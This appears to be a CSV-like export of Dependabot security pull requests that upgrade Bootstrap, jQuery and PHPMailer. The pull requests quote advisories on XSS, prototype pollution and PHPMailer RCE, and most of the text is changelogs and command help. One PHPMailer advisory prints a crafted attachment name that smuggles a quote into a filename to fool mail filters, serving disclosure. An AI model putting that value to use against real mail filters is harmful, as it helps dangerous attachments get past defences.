<p>See <a href=""https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"">https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/</a> for more info.</p>
<p>Affected versions: &gt;= 3.0.0 &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects bootstrap</strong>
In Bootstrap before 3.4.0, XSS is possible in the tooltip data-viewport attribute.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects bootstrap</strong>
In Bootstrap before 3.4.0, XSS is possible in the affix configuration target property.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap and bootstrap-sass</strong>
In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: <a href=""https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/"">https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/</a></p>
<p>Affected versions: &gt;= 3.0.0 &lt; 3.4.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/twbs/bootstrap/releases"">bootstrap's releases</a>.</em></p>
<blockquote>
<h2>v4.1.2</h2>
<ul>
<li>Fixed an XSS vulnerability in tooltip, collapse, and scrollspy plugins</li>
<li>Improved how we query elements in our JavaScript plugins</li>
<li>Inline SVGs now have the same vertical alignment as images</li>
<li>Fixed issues with double transitions on carousels</li>
<li>Added Edge and IE10-11 fallbacks to our floating labels example</li>
<li>Various improvements to form controls, including disabled states on file inputs and unified focus styles for selects</li>
</ul>
<p>Checkout the <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/26423"">v4.1.2 ship list</a> and <a href=""https://github.com/twbs/bootstrap/projects/14"">GitHub project</a> for the full details.</p>
<h2>v4.1.1</h2>
<p><strong>Our first patch release for Bootstrap 4!</strong> Here's a quick rundown of some of the changes:</p>
<ul>
<li>Added validation styles for file inputs</li>
<li>Improved printing of dark tables</li>
<li>Suppressed that <code>text-hide</code> deprecation notice by default</li>
<li>Cleaned up some JS globals and improve coverage</li>
<li>Bumped dependencies, namely Jekyll</li>
<li>Fixed docs issue with incorrect name for our monospace font utility</li>
</ul>
<p>Checkout the <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/25971"">v4.1.1 ship list</a> and <a href=""https://github.com/twbs/bootstrap/projects/13"">GitHub project</a> for the full details.</p>
<h2>v4.1.0</h2>
<ul>
<li>Added new custom range form control.</li>
<li>Added new <code>.carousel-fade</code> modifier to switch carousel from horizontal sliding to crossfade.</li>
<li>Added new <code>.dropdown-item-text</code> for plaintext dropdown items.</li>
<li>Added new <code>.flex-fill</code>, <code>.flex-grow-*</code>, and <code>.flex-shrink-*</code> utilities.</li>
<li>Added new <code>.table-borderless</code> variant for tables.</li>
<li>Added new <code>.text-monospace</code> utility.</li>
<li>Added new <code>.text-body</code> (default body color), <code>.text-black-50</code> (50% opacity black), and <code>.text-white-50</code> (50% opacity white) utilities.</li>
<li>Added new <code>.shadow-*</code> utilities for quickly adding <code>box-shadow</code>s.</li>
<li>Added ability to disable Popper's positioning in dropdowns.</li>
<li>Fixed longstanding issue with Chrome incorrectly rendering cards across CSS columns.</li>
<li>Deprecated <code>.text-hide</code>—you'll see a warning during compilation—as it's a dated and undocumented feature.</li>
<li>Fixed up Dashboard and Offcanvas examples across Firefox and IE.</li>
<li>Breadcrumbs can now use non-string values as dividers.</li>
<li>Updated our Theming docs to confirm you <em>cannot</em> use CSS variables in media queries (sorry folks!).</li>
</ul>
<p>Be sure to look at the <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/25375"">ship list</a> and <a href=""https://github.com/twbs/bootstrap/projects/5"">project board</a> for more details on all our fixes.</p>
<h2>v4.0.0</h2>
<p>Our first stable v4 release! 🎉</p>
<h3>Highlights:</h3>
<ul>
<li>Brand new examples and overhauls for existing ones.</li>
<li>Additional border utilities have been added and the default <code>border-color</code> for them darkened from <code>$gray-200</code> to <code>$gray-300</code>.</li>
<li>Pagination focus styles now match button and input focus state.</li>
<li>Added responsive <code>.order-0</code> classes to reset column order.</li>
<li>Improved examples of form validation documentation by adding tooltip examples and more.</li>
<li>New documentation added for using our CSS variables to the <a href=""https://getbootstrap.com/docs/4.0/getting-started/theming/"">Theming page</a>.</li>
</ul>
</tr></table> ... (truncated)
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/twbs/bootstrap/commit/1f46337a89ed21c94a7c37bc0c0e14a71fef7d97""><code>1f46337</code></a> Update README.md</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/c4ccfbe04e888f3623d74963ba72d2320da0785a""><code>c4ccfbe</code></a> Ship v4.1.2</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/a49f5cab6fb2e106113e5ab59fdcecc7f9349301""><code>a49f5ca</code></a> Clean up npm scripts a bit more.</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/6589408a4b91c0f58fa4ac1508d69e3e9e4345e1""><code>6589408</code></a> Update scripts.</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/de7bef881e9431df4b75cd08968351f4fa1ffaa0""><code>de7bef8</code></a> update card columns docs to make copy more accurate</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/5a11ba5d6b5e07ff4f0bb241171d1a1752c1c375""><code>5a11ba5</code></a> clarify docs dev and add 4.0 link</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/aedd7007682ef39feefce2aea1e4ddba5637cf04""><code>aedd700</code></a> change dist to only affect main since docs css isn't distributed</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/4518288c7ceb92aa8f1b61a383bc75d6c90017d1""><code>4518288</code></a> Move copy tasks back to css-main and js-compile so docs-github task runs prop...</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/159aebc27461553e2ad9ff26a3922eff2d392a34""><code>159aebc</code></a> Update watch scripts to properly copy JS files</li>
<li><a href=""https://github.com/twbs/bootstrap/commit/01f568d9a5c60b3bd7c85c409247e117dd11df9f""><code>01f568d</code></a> fixes <a href=""https://github-redirect.dependabot.com/twbs/bootstrap/issues/26637"">#26637</a></li>
<li>Additional commits viewable in <a href=""https://github.com/twbs/bootstrap/compare/v3.3.7...v4.1.2"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=bootstrap&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=4.1.2)](https://dependabot.com/compatibility-score/?dependency-name=bootstrap&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=4.1.2)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,609405888,"[Security] Bump jquery from 3.3.1 to 3.5.0","Bumps [jquery](https://github.com/jquery/jquery) from 3.3.1 to 3.5.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-gxr4-xjj5-5px2"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Potential XSS vulnerability in jQuery</strong></p>
<h3>Impact</h3>
<p>Passing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. <code>.html()</code>, <code>.append()</code>, and others) may execute untrusted code.</p>
<h3>Patches</h3>
<p>This problem is patched in jQuery 3.5.0.</p>
<h3>Workarounds</h3>
<p>To workaround the issue without upgrading, adding the following to your code:</p>
<pre lang=""js""><code>jQuery.htmlPrefilter = function( html ) {
	return html;
};
</code></pre>
<p>You need to use at least jQuery 1.12/2.2 or newer to be able to apply this workaround.</p>
<h3>References</h3>
<p><a href=""https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/"">https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/</a>
<a href=""https://jquery.com/upgrade-guide/3.5/"">https://jquery.com/upgrade-guide/3.5/</a></p>
</tr></table> ... (truncated)
<p>Affected versions: &gt;= 1.2 &lt; 3.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jpcq-cgw6-v4j6"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Potential XSS vulnerability in jQuery</strong>
In jQuery versions greater than or equal to 1.0.3 and before 3.5.0, passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code.</p>
<p>This problem is patched in jQuery 3.5.0.</p>
<p>Affected versions: &gt;= 1.0.3 &lt; 3.5.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects jquery</strong>
A prototype pollution vulnerability exists in jQuery versions &lt; 3.4.0 that allows an attacker to inject properties on Object.prototype.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects jquery</strong>
jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution. If an unsanitized source object contained an enumerable <strong>proto</strong> property, it could extend the native Object.prototype.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/jquery/jquery/commit/7a0a850f3d41c0412609c1d32b1e602d4afe2f4e""><code>7a0a850</code></a> 3.5.0</li>
<li><a href=""https://github.com/jquery/jquery/commit/8570a08f6689223aa06ca8cc51d488c6d81d44f9""><code>8570a08</code></a> Release: Update AUTHORS.txt</li>
<li><a href=""https://github.com/jquery/jquery/commit/da3dd85b63c4e3a6a768132c2a83a1a6eec24840""><code>da3dd85</code></a> Ajax: Do not execute scripts for unsuccessful HTTP responses</li>
<li><a href=""https://github.com/jquery/jquery/commit/065143c2e93512eb0c82d1b344b71d06eb7cf01c""><code>065143c</code></a> Ajax: Overwrite s.contentType with content-type header value, if any</li>
<li><a href=""https://github.com/jquery/jquery/commit/1a4f10ddc37c34c6dc3a451ee451b5c6cf367399""><code>1a4f10d</code></a> Tests: Blacklist one focusin test in IE</li>
<li><a href=""https://github.com/jquery/jquery/commit/9e15d6b469556eccfa607c5ecf53b20c84529125""><code>9e15d6b</code></a> Event: Use only one focusin/out handler per matching window &amp; document</li>
<li><a href=""https://github.com/jquery/jquery/commit/966a70909019aa09632c87c0002c522fa4a1e30e""><code>966a709</code></a> Manipulation: Skip the select wrapper for &lt;option&gt; outside of IE 9</li>
<li><a href=""https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77""><code>1d61fd9</code></a> Manipulation: Make jQuery.htmlPrefilter an identity function</li>
<li><a href=""https://github.com/jquery/jquery/commit/04bf577e2f961c9dde85ddadc77f71bc7bc671cc""><code>04bf577</code></a> Selector: Update Sizzle from 2.3.4 to 2.3.5</li>
<li><a href=""https://github.com/jquery/jquery/commit/7506c9ca62a2f3ef773e19385918c31e9d62d412""><code>7506c9c</code></a> Build: Resolve Travis config warnings</li>
<li>Additional commits viewable in <a href=""https://github.com/jquery/jquery/compare/3.3.1...3.5.0"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~mgol"">mgol</a>, a new releaser for jquery since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=jquery&package-manager=npm_and_yarn&previous-version=3.3.1&new-version=3.5.0)](https://dependabot.com/compatibility-score/?dependency-name=jquery&package-manager=npm_and_yarn&previous-version=3.3.1&new-version=3.5.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,922949324,"[Security] Bump phpmailer/phpmailer from 5.2.28 to 6.5.0","Bumps [phpmailer/phpmailer](https://github.com/PHPMailer/PHPMailer) from 5.2.28 to 6.5.0. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-3603.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Untrusted code may be run from an overridden address validator</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpmailer/phpmailer/CVE-2021-34551.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>RCE affecting Windows hosts via UNC paths to translation files</strong></p>
<p>Affected versions: &lt;6.5.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-f7hx-fqxw-rvvj"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Insufficient output escaping of attachment names in PHPMailer</strong></p>
<h3>Impact</h3>
<p>CWE-116: Incorrect output escaping.</p>
<p>An attachment added like this (note the double quote within the attachment name, which is entirely valid):</p>
<pre><code>$mail-&amp;gt;addAttachment('/tmp/attachment.tmp', 'filename.html&quot;;.jpg');
</code></pre>
<p>Will result in a message containing these headers:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html&quot;;.jpg&quot;
Content-Disposition: attachment; filename=&quot;filename.html&quot;;.jpg&quot;
</code></pre>
<p>The attachment will be named <code>filename.html</code>, and the trailing <code>&quot;;.jpg&quot;</code> will be ignored. Mail filters that reject <code>.html</code> attachments but permit <code>.jpg</code> attachments may be fooled by this.</p>
<p>Note that the MIME type itself is obtained automatically from the <em>source filename</em> (in this case <code>attachment.tmp</code>, which maps to a generic <code>application/octet-stream</code> type), and not the <em>name</em> given to the attachment (though these are the same if a separate name is not provided), though it can be set explicitly in other parameters to attachment methods.</p>
<h3>Patches</h3>
<p>Patched in PHPMailer 6.1.6 by escaping double quotes within the name using a backslash, as per RFC822 section 3.4.1, resulting in correctly escaped headers like this:</p>
<pre><code>Content-Type: application/octet-stream; name=&quot;filename.html\&quot;;.jpg&quot;
</code></pre>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &lt; 6.1.6</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/releases"">phpmailer/phpmailer's releases</a>.</em></p>
<blockquote>
<h2>PHPMailer 6.5.0</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/HEAD/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<p>Thanks to Vikrant Singh Chauhan, listensec.com, and the WordPress security team for reporting and assistance with this release.</p>
<h2>PHPMailer 6.4.1</h2>
<p>This is a security release.</p>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<p>Thanks to Fariskhi Vidyan for the report and assistance, and Tidelift for support.</p>
<h2>PHPMailer 6.4.0</h2>
<p>This is a maintenance release. The changes introduced in 6.3.0 for setting an envelope sender automatically when using <code>mail()</code> caused problems, <a href=""https://core.trac.wordpress.org/ticket/52822"">especially in WordPress</a>, so this change has been reverted. It gets a minor version bump as it's a change in behaviour, but only back to what 6.2.0 did. See <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">#2298</a> for more info.</p>
<p>Other changes:</p>
<ul>
<li>Check for the mbstring extension before decoding addresss in <code>parseAddress</code>, so it won't fail if you don't have it installed</li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in <a href=""https://tidelift.com"">Tidelift</a>, because supporting open-source is important!</li>
</ul>
<h2>PHPMailer 6.3.0</h2>
<p>This is a maintenance release.</p>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>PHPMailer 6.2.0</h2>
<p>This is a maintenance release. With this release, PHPMailer gains official PHP 8 compatibility; earlier versions worked in PHP 8 pre-releases, but the test suite did not. The considerable rework this required (which also restored tests running on older PHP versions) was done by <a href=""https://github.com/jrfnl""><code>@​jrfnl</code></a> – thank you very much!</p>
<ul>
<li>PHP 8.0 compatibility</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md"">phpmailer/phpmailer's changelog</a>.</em></p>
<blockquote>
<h2>Version 6.5.0 (June 16th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2021-34551, a complex RCE affecting Windows hosts. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue changes the way that language files are loaded. While they remain in the same PHP-like format, they are processed as plain text, and any code in them will not be run, including operations such as concatenation using the <code>.</code> operator.</li>
<li><em>Deprecation</em> The current translation file format using PHP arrays is now deprecated; the next major version will introduce a new format.</li>
<li><strong>SECURITY</strong> Fixes CVE-2021-3603 that may permit untrusted code to be run from an address validator. See <a href=""https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md"">https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md</a> for details.</li>
<li>The fix for this issue includes a minor BC break: callables injected into <code>validateAddress</code>, or indirectly through the <code>$validator</code> class property, may no longer be simple strings. If you want to inject your own validator, provide a closure instead of a function name.</li>
<li>Haraka message ID strings are now recognised</li>
</ul>
<h2>Version 6.4.1 (April 29th, 2021)</h2>
<ul>
<li><strong>SECURITY</strong> Fixes CVE-2020-36326, a regression of CVE-2018-19296 object injection introduced in 6.1.8, see SECURITY.md for details</li>
<li>Reject more file paths that look like URLs, matching RFC3986 spec, blocking URLS using schemes such as <code>ssh2</code></li>
<li>Ensure method signature consistency in <code>doCallback</code> calls</li>
<li>Ukrainian language update</li>
<li>Add composer scripts for checking coding standards and running tests</li>
</ul>
<h2>Version 6.4.0 (March 31st, 2021)</h2>
<ul>
<li>Revert change that made the <code>mail()</code> and sendmail transports set the envelope sender if one isn't explicitly provided, as it causes problems described in <a href=""https://github-redirect.dependabot.com/PHPMailer/PHPMailer/issues/2298"">PHPMailer/PHPMailer#2298</a></li>
<li>Check for mbstring extension before decoding addresss in <code>parseAddress</code></li>
<li>Add Serbian Latin translation (<code>sr_latn</code>)</li>
<li>Enrol PHPMailer in Tidelift</li>
</ul>
<h2>Version 6.3.0 (February 19th, 2021)</h2>
<ul>
<li>Handle early connection errors such as 421 during connection and EHLO states</li>
<li>Switch to Github Actions for CI</li>
<li>Generate debug output for <code>mail()</code>, sendmail, and qmail transports. Enable using the same mechanism as for SMTP: set <code>SMTPDebug</code> &gt; 0</li>
<li>Make the <code>mail()</code> and sendmail transports set the envelope sender the same way as SMTP does, i.e. use whatever <code>From</code> is set to, only falling back to the <code>sendmail_from</code> php.ini setting if <code>From</code> is unset. This avoids errors from the <code>mail()</code> function if <code>Sender</code> is not set explicitly and php.ini is not configured. This is a minor functionality change, so bumps the minor version number.</li>
<li>Extend <code>parseAddresses</code> to decode encoded names, improve tests</li>
</ul>
<h2>Version 6.2.0</h2>
<ul>
<li>PHP 8.0 compatibility, many thanks to <a href=""https://github.com/jrf""><code>@​jrf</code></a>_nl!</li>
<li>Switch from PHP CS Fixer to PHP CodeSniffer for coding standards</li>
<li>Create class constants for the debug levels in the POP3 class</li>
<li>Improve French, Slovenian, and Ukrainian translations</li>
<li>Improve file upload examples so file extensions are retained</li>
<li>Resolve PHP 8 line break issues due to a very old PHP bug being fixed</li>
<li>Avoid warnings when using old openssl functions</li>
<li>Improve Travis-CI build configuration</li>
</ul>
<h2>Version 6.1.8 (October 9th, 2020)</h2>
<ul>
<li>Mark <code>ext-hash</code> as required in composer.json. This has long been required, but now it will cause an error at install time rather than runtime, making it easier to diagnose</li>
<li>Make file upload examples safer</li>
<li>Update links to SMTP testing servers</li>
<li>Avoid errors when set_time_limit is disabled (you need better hosting!)</li>
<li>Allow overriding auth settings for local tests; makes it easy to run tests using HELO</li>
<li>Recover gracefully from errors during keepalive sessions</li>
<li>Add AVIF MIME type mapping</li>
<li>Prevent duplicate <code>To</code> headers in BCC-only messages when using <code>mail()</code></li>
<li>Avoid file function problems when attaching files from Windows UNC paths</li>
<li>Improve German, Bahasa Indonesian, Filipino translations</li>
<li>Add Javascript-based example</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/a5b5c43e50b7fba655f793ad27303cd74c57363c""><code>a5b5c43</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/e121da364fbf25d861f8131e4c742ab875f1444e""><code>e121da3</code></a> Merge branch 'master' of <a href=""https://github.com/PHPMailer/PHPMailer"">https://github.com/PHPMailer/PHPMailer</a></li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/74e512aa750f8f9a2a927161706c5027a3aefb76""><code>74e512a</code></a> Security update</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/acd264bf17ff4ac5c915f0d4226dce8a9ea70bc3""><code>acd264b</code></a> Merge branch 'CVE-2021-34551'</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/0063f83e8ccdd46faa473c541f7dd8ba46ebc37a""><code>0063f83</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/707205f25572332079b8c77c06a26d4ebb54d90f""><code>707205f</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/1047838e84c8ec99c566c9a52336d9dbddd4e333""><code>1047838</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/c2f191be6bd6ba6a62cd899a7cce409da9651a85""><code>c2f191b</code></a> Changelog</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/45f3c18dc6a2de1cb1bf49b9b249a9ee36a5f7f3""><code>45f3c18</code></a> Deny string-based callables altogether</li>
<li><a href=""https://github.com/PHPMailer/PHPMailer/commit/6334bab2affb132b1445825a0f1f82f7869b981e""><code>6334bab</code></a> CVE docs</li>
<li>Additional commits viewable in <a href=""https://github.com/PHPMailer/PHPMailer/compare/v5.2.28...v6.5.0"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=5.2.28&new-version=6.5.0)](https://dependabot.com/compatibility-score/?dependency-name=phpmailer/phpmailer&package-manager=composer&previous-version=5.2.28&new-version=6.5.0)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
